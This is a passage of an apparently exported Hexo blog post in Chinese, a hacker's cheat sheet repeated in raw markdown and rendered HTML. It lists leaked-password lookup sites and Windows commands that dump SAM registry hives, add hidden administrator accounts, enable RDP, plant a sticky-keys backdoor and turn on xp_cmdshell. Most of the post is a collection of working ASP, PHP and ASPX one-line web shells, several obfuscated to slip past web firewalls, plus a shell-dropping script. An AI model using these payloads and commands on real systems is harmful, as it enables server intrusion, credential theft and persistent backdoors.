str_replace(x,\"\",\"axsxxsxexrxxt\");\n$a($_POST[\"test\"]); ?>\n```\n\n## PHP高强度一句话：\n```\n<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>  \n```\n\n菜刀连接：``/x.php?x=lostwolf``  脚本类型：php  密码：c\n```\n<?php assert($_REQUEST[\"c\"]);?>\n```\n\n## aspx过狗\n```\n<%@ Page Language=\"Jscript\"%><%var name:String=Request.Item[\"cmd\"];Response.Write(eval(name,\"unsafe\"));%>\n```\n\n# 那些神器\n* Sqlmap\n\n","source":"_posts/那些Hack神器及奇技淫巧.md","raw":"---\ntitle: 那些Hack神器及奇技淫巧\ndate: 2016-09-11 23:07:28\npermalink: hacktool\ntags: Hack\ncategories: Hack\n\n---\n# 简介\n这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。\n\n# 那些网站\n## 社工库\n\n### 国内\n\nhttp://www.findmima.com/\n\nhttp://www.wghostk.com/so/\n\nhttp://p.08lt.com\n\nhttp://www.144118.com/\n\n### 国际\n\nhttps://haveibeenpwned.com/\n\nhttps://leakbase.pw/\n\n## C段\nhttp://www.144118.com/\n\n## whois查询\nhttp://whois.domaintools.com/\n\n## 历史页面\n\n# 那些实用命令\n## reg导出sam\nreg save hklm\\sam sam.hive\n\nreg save hklm\\system system.hive\n\nreg save hklm\\security security.hive\n\n## Windows新建用户\nnet user admin$ admin /add\n\nnet localgroup administrators admin$ /add\n\nnet user Guest 1234\n\nnet user Guest /active:yes\n\nnet localgroup administrators Guest /add\n\n## 打开3389(2003,xp)\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n## sethc后门\nCopy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y\n\n## mssql xpcmdshell报错\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n\n# 那些一句话\n\n## asp一句话木马\n```\n<%eval request(\"x\")%>\n```\n\n## php一句话木马\n```\n<?php eval($_POST[g]);?>\n```\n\n## aspx一句话\n```\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"x\"],\"unsafe\");%>\n```\n\n## 数据库加密一句话(密码a)\n```\n┼攠數畣整爠煥敵瑳∨≡┩愾\n```\n\n## 网站配置、版权信息专用一句话\n```\n\"%><%Eval Request(x)%>\n```\n\n## 一句话再过护卫神\n```\n<%Y=request(\"x\")%> <%execute(Y)%>\n```\n\n## 过拦截一句话木马\n```\n<% eXEcGlOBaL ReQuEsT(\"x\") %>\n```\n\n## asp闭合型一句话 \n```\n%><%eval request(\"0o1Znz1ow\")%><%\n```\n\n## 能过安全狗的解析格式\n```\n;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg\n```\n\n## 突破安全狗的一句话\n```\n<%Y=request(\"x\")%> <%eval(Y)%>\n```\n\n## elong过安全狗的php一句话\n```\n<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>\n```\n\n## 后台常用写入php一句话（密码x）\n```\n<? \n $fp = @fopen(\"c.php\", 'a'); \n @fwrite($fp, '<'.'?php'.\"\\r\\n\\r\\n\".'eval($_POST[x])'.\"\\r\\n\\r\\n?\".\">\\r\\n\"); \n @fclose($fp); \n ?>\n```\n \n## 高强度php一句话\n```\n<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>\n```\n\n## 新型变异PHP一句话(密码b4dboy)\n```\n($b4dboy = $_POST['b4dboy']) && @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);\n```\n\n## 突破安全狗的aspx一句话\n```\n<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>\n<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"你的密码\"].Value))).CreateInstance(\"c\", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>\n```\n\n## 突破护卫神，保护盾一句话\n```\n<?php $a = str_replace(x,\"\",\"axsxxsxexrxxt\");\n$a($_POST[\"test\"]); ?>\n```\n\n## PHP高强度一句话：\n```\n<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>  \n```\n\n菜刀连接：``/x.php?x=lostwolf``  脚本类型：php  密码：c\n```\n<?php assert($_REQUEST[\"c\"]);?>\n```\n\n## aspx过狗\n```\n<%@ Page Language=\"Jscript\"%><%var name:String=Request.Item[\"cmd\"];Response.Write(eval(name,\"unsafe\"));%>\n```\n\n# 那些神器\n* Sqlmap\n\n","slug":"hacktool","published":1,"updated":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym301s0025cdonkqxsk9ox","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。</p>\n<h1 id=\"那些网站\"><a href=\"#那些网站\" class=\"headerlink\" title=\"那些网站\"></a>那些网站</h1><h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><h3 id=\"国内\"><a href=\"#国内\" class=\"headerlink\" title=\"国内\"></a>国内</h3><p><a href=\"http://www.findmima.com/\" target=\"_blank\" rel=\"external\">http://www.findmima.com/</a></p>\n<p><a href=\"http://www.wghostk.com/so/\" target=\"_blank\" rel=\"external\">http://www.wghostk.com/so/</a></p>\n<p><a href=\"http://p.08lt.com\" target=\"_blank\" rel=\"external\">http://p.08lt.com</a></p>\n<p><a href=\"http://www.144118.com/\" target=\"_blank\" rel=\"external\">http://www.144118.com/</a></p>\n<h3 id=\"国际\"><a href=\"#国际\" class=\"headerlink\" title=\"国际\"></a>国际</h3><p><a href=\"https://haveibeenpwned.com/\" target=\"_blank\" rel=\"external\">https://haveibeenpwned.com/</a></p>\n<p><a href=\"https://leakbase.pw/\" target=\"_blank\" rel=\"external\">https://leakbase.pw/</a></p>\n<h2 id=\"C段\"><a href=\"#C段\" class=\"headerlink\" title=\"C段\"></a>C段</h2><p><a href=\"http://www.144118.com/\" target=\"_blank\" rel=\"external\">http://www.144118.com/</a></p>\n<h2 id=\"whois查询\"><a href=\"#whois查询\" class=\"headerlink\" title=\"whois查询\"></a>whois查询</h2><p><a href=\"http://whois.domaintools.com/\" target=\"_blank\" rel=\"external\">http://whois.domaintools.com/</a></p>\n<h2 id=\"历史页面\"><a href=\"#历史页面\" class=\"headerlink\" title=\"历史页面\"></a>历史页面</h2><h1 id=\"那些实用命令\"><a href=\"#那些实用命令\" class=\"headerlink\" title=\"那些实用命令\"></a>那些实用命令</h1><h2 id=\"reg导出sam\"><a href=\"#reg导出sam\" class=\"headerlink\" title=\"reg导出sam\"></a>reg导出sam</h2><p>reg save hklm\\sam sam.hive</p>\n<p>reg save hklm\\system system.hive</p>\n<p>reg save hklm\\security security.hive</p>\n<h2 id=\"Windows新建用户\"><a href=\"#Windows新建用户\" class=\"headerlink\" title=\"Windows新建用户\"></a>Windows新建用户</h2><p>net user admin$ admin /add</p>\n<p>net localgroup administrators admin$ /add</p>\n<p>net user Guest 1234</p>\n<p>net user Guest /active:yes</p>\n<p>net localgroup administrators Guest /add</p>\n<h2 id=\"打开3389-2003-xp\"><a href=\"#打开3389-2003-xp\" class=\"headerlink\" title=\"打开3389(2003,xp)\"></a>打开3389(2003,xp)</h2><p>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>\n<h2 id=\"sethc后门\"><a href=\"#sethc后门\" class=\"headerlink\" title=\"sethc后门\"></a>sethc后门</h2><p>Copy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y</p>\n<h2 id=\"mssql-xpcmdshell报错\"><a href=\"#mssql-xpcmdshell报错\" class=\"headerlink\" title=\"mssql xpcmdshell报错\"></a>mssql xpcmdshell报错</h2><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>\n<h1 id=\"那些一句话\"><a href=\"#那些一句话\" class=\"headerlink\" title=\"那些一句话\"></a>那些一句话</h1><h2 id=\"asp一句话木马\"><a href=\"#asp一句话木马\" class=\"headerlink\" title=\"asp一句话木马\"></a>asp一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%eval request(&quot;x&quot;)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"php一句话木马\"><a href=\"#php一句话木马\" class=\"headerlink\" title=\"php一句话木马\"></a>php一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php eval($_POST[g]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"aspx一句话\"><a href=\"#aspx一句话\" class=\"headerlink\" title=\"aspx一句话\"></a>aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"数据库加密一句话-密码a\"><a href=\"#数据库加密一句话-密码a\" class=\"headerlink\" title=\"数据库加密一句话(密码a)\"></a>数据库加密一句话(密码a)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure>\n<h2 id=\"网站配置、版权信息专用一句话\"><a href=\"#网站配置、版权信息专用一句话\" class=\"headerlink\" title=\"网站配置、版权信息专用一句话\"></a>网站配置、版权信息专用一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&quot;%&gt;&lt;%Eval Request(x)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"一句话再过护卫神\"><a href=\"#一句话再过护卫神\" class=\"headerlink\" title=\"一句话再过护卫神\"></a>一句话再过护卫神</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"过拦截一句话木马\"><a href=\"#过拦截一句话木马\" class=\"headerlink\" title=\"过拦截一句话木马\"></a>过拦截一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"asp闭合型一句话\"><a href=\"#asp闭合型一句话\" class=\"headerlink\" title=\"asp闭合型一句话\"></a>asp闭合型一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%</div></pre></td></tr></table></figure>\n<h2 id=\"能过安全狗的解析格式\"><a href=\"#能过安全狗的解析格式\" class=\"headerlink\" title=\"能过安全狗的解析格式\"></a>能过安全狗的解析格式</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的一句话\"><a href=\"#突破安全狗的一句话\" class=\"headerlink\" title=\"突破安全狗的一句话\"></a>突破安全狗的一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"elong过安全狗的php一句话\"><a href=\"#elong过安全狗的php一句话\" class=\"headerlink\" title=\"elong过安全狗的php一句话\"></a>elong过安全狗的php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"后台常用写入php一句话（密码x）\"><a href=\"#后台常用写入php一句话（密码x）\" class=\"headerlink\" title=\"后台常用写入php一句话（密码x）\"></a>后台常用写入php一句话（密码x）</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;? </div><div class=\"line\"> $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); </div><div class=\"line\"> @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\\r\\n\\r\\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\\r\\n\\r\\n?&quot;.&quot;&gt;\\r\\n&quot;); </div><div class=\"line\"> @fclose($fp); </div><div class=\"line\"> ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"高强度php一句话\"><a href=\"#高强度php一句话\" class=\"headerlink\" title=\"高强度php一句话\"></a>高强度php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"新型变异PHP一句话-密码b4dboy\"><a href=\"#新型变异PHP一句话-密码b4dboy\" class=\"headerlink\" title=\"新型变异PHP一句话(密码b4dboy)\"></a>新型变异PHP一句话(密码b4dboy)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的aspx一句话\"><a href=\"#突破安全狗的aspx一句话\" class=\"headerlink\" title=\"突破安全狗的aspx一句话\"></a>突破安全狗的aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;</div><div class=\"line\">&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"突破护卫神，保护盾一句话\"><a href=\"#突破护卫神，保护盾一句话\" class=\"headerlink\" title=\"突破护卫神，保护盾一句话\"></a>突破护卫神，保护盾一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);</div><div class=\"line\">$a($_POST[&quot;test&quot;]); ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"PHP高强度一句话：\"><a href=\"#PHP高强度一句话：\" class=\"headerlink\" title=\"PHP高强度一句话：\"></a>PHP高强度一句话：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<p>菜刀连接：<code>/x.php?x=lostwolf</code>  脚本类型：php  密码：c<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"aspx过狗\"><a href=\"#aspx过狗\" class=\"headerlink\" title=\"aspx过狗\"></a>aspx过狗</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;</div></pre></td></tr></table></figure>\n<h1 id=\"那些神器\"><a href=\"#那些神器\" class=\"headerlink\" title=\"那些神器\"></a>那些神器</h1><ul>\n<li>Sqlmap</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。</p>\n<h1 id=\"那些网站\"><a href=\"#那些网站\" class=\"headerlink\" title=\"那些网站\"></a>那些网站</h1><h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><h3 id=\"国内\"><a href=\"#国内\" class=\"headerlink\" title=\"国内\"></a>国内</h3><p><a href=\"http://www.findmima.com/\">http://www.findmima.com/</a></p>\n<p><a href=\"http://www.wghostk.com/so/\">http://www.wghostk.com/so/</a></p>\n<p><a href=\"http://p.08lt.com\">http://p.08lt.com</a></p>\n<p><a href=\"http://www.144118.com/\">http://www.144118.com/</a></p>\n<h3 id=\"国际\"><a href=\"#国际\" class=\"headerlink\" title=\"国际\"></a>国际</h3><p><a href=\"https://haveibeenpwned.com/\">https://haveibeenpwned.com/</a></p>\n<p><a href=\"https://leakbase.pw/\">https://leakbase.pw/</a></p>\n<h2 id=\"C段\"><a href=\"#C段\" class=\"headerlink\" title=\"C段\"></a>C段</h2><p><a href=\"http://www.144118.com/\">http://www.144118.com/</a></p>\n<h2 id=\"whois查询\"><a href=\"#whois查询\" class=\"headerlink\" title=\"whois查询\"></a>whois查询</h2><p><a href=\"http://whois.domaintools.com/\">http://whois.domaintools.com/</a></p>\n<h2 id=\"历史页面\"><a href=\"#历史页面\" class=\"headerlink\" title=\"历史页面\"></a>历史页面</h2><h1 id=\"那些实用命令\"><a href=\"#那些实用命令\" class=\"headerlink\" title=\"那些实用命令\"></a>那些实用命令</h1><h2 id=\"reg导出sam\"><a href=\"#reg导出sam\" class=\"headerlink\" title=\"reg导出sam\"></a>reg导出sam</h2><p>reg save hklm\\sam sam.hive</p>\n<p>reg save hklm\\system system.hive</p>\n<p>reg save hklm\\security security.hive</p>\n<h2 id=\"Windows新建用户\"><a href=\"#Windows新建用户\" class=\"headerlink\" title=\"Windows新建用户\"></a>Windows新建用户</h2><p>net user admin$ admin /add</p>\n<p>net localgroup administrators admin$ /add</p>\n<p>net user Guest 1234</p>\n<p>net user Guest /active:yes</p>\n<p>net localgroup administrators Guest /add</p>\n<h2 id=\"打开3389-2003-xp\"><a href=\"#打开3389-2003-xp\" class=\"headerlink\" title=\"打开3389(2003,xp)\"></a>打开3389(2003,xp)</h2><p>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>\n<h2 id=\"sethc后门\"><a href=\"#sethc后门\" class=\"headerlink\" title=\"sethc后门\"></a>sethc后门</h2><p>Copy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y</p>\n<h2 id=\"mssql-xpcmdshell报错\"><a href=\"#mssql-xpcmdshell报错\" class=\"headerlink\" title=\"mssql xpcmdshell报错\"></a>mssql xpcmdshell报错</h2><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>\n<h1 id=\"那些一句话\"><a href=\"#那些一句话\" class=\"headerlink\" title=\"那些一句话\"></a>那些一句话</h1><h2 id=\"asp一句话木马\"><a href=\"#asp一句话木马\" class=\"headerlink\" title=\"asp一句话木马\"></a>asp一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%eval request(&quot;x&quot;)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"php一句话木马\"><a href=\"#php一句话木马\" class=\"headerlink\" title=\"php一句话木马\"></a>php一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php eval($_POST[g]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"aspx一句话\"><a href=\"#aspx一句话\" class=\"headerlink\" title=\"aspx一句话\"></a>aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"数据库加密一句话-密码a\"><a href=\"#数据库加密一句话-密码a\" class=\"headerlink\" title=\"数据库加密一句话(密码a)\"></a>数据库加密一句话(密码a)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure>\n<h2 id=\"网站配置、版权信息专用一句话\"><a href=\"#网站配置、版权信息专用一句话\" class=\"headerlink\" title=\"网站配置、版权信息专用一句话\"></a>网站配置、版权信息专用一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&quot;%&gt;&lt;%Eval Request(x)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"一句话再过护卫神\"><a href=\"#一句话再过护卫神\" class=\"headerlink\" title=\"一句话再过护卫神\"></a>一句话再过护卫神</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"过拦截一句话木马\"><a href=\"#过拦截一句话木马\" class=\"headerlink\" title=\"过拦截一句话木马\"></a>过拦截一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"asp闭合型一句话\"><a href=\"#asp闭合型一句话\" class=\"headerlink\" title=\"asp闭合型一句话\"></a>asp闭合型一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%</div></pre></td></tr></table></figure>\n<h2 id=\"能过安全狗的解析格式\"><a href=\"#能过安全狗的解析格式\" class=\"headerlink\" title=\"能过安全狗的解析格式\"></a>能过安全狗的解析格式</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的一句话\"><a href=\"#突破安全狗的一句话\" class=\"headerlink\" title=\"突破安全狗的一句话\"></a>突破安全狗的一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"elong过安全狗的php一句话\"><a href=\"#elong过安全狗的php一句话\" class=\"headerlink\" title=\"elong过安全狗的php一句话\"></a>elong过安全狗的php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"后台常用写入php一句话（密码x）\"><a href=\"#后台常用写入php一句话（密码x）\" class=\"headerlink\" title=\"后台常用写入php一句话（密码x）\"></a>后台常用写入php一句话（密码x）</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;? </div><div class=\"line\"> $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); </div><div class=\"line\"> @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\\r\\n\\r\\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\\r\\n\\r\\n?&quot;.&quot;&gt;\\r\\n&quot;); </div><div class=\"line\"> @fclose($fp); </div><div class=\"line\"> ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"高强度php一句话\"><a href=\"#高强度php一句话\" class=\"headerlink\" title=\"高强度php一句话\"></a>高强度php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"新型变异PHP一句话-密码b4dboy\"><a href=\"#新型变异PHP一句话-密码b4dboy\" class=\"headerlink\" title=\"新型变异PHP一句话(密码b4dboy)\"></a>新型变异PHP一句话(密码b4dboy)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的aspx一句话\"><a href=\"#突破安全狗的aspx一句话\" class=\"headerlink\" title=\"突破安全狗的aspx一句话\"></a>突破安全狗的aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;</div><div class=\"line\">&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"突破护卫神，保护盾一句话\"><a href=\"#突破护卫神，保护盾一句话\" class=\"headerlink\" title=\"突破护卫神，保护盾一句话\"></a>突破护卫神，保护盾一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);</div><div class=\"line\">$a($_POST[&quot;test&quot;]); ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"PHP高强度一句话：\"><a href=\"#PHP高强度一句话：\" class=\"headerlink\" title=\"PHP高强度一句话：\"></a>PHP高强度一句话：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<p>菜刀连接：<code>/x.php?x=lostwolf</code>  脚本类型：php  密码：c<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"aspx过狗\"><a href=\"#aspx过狗\" class=\"headerlink\" title=\"aspx过狗\"></a>aspx过狗</h2><figure class=\"highlight 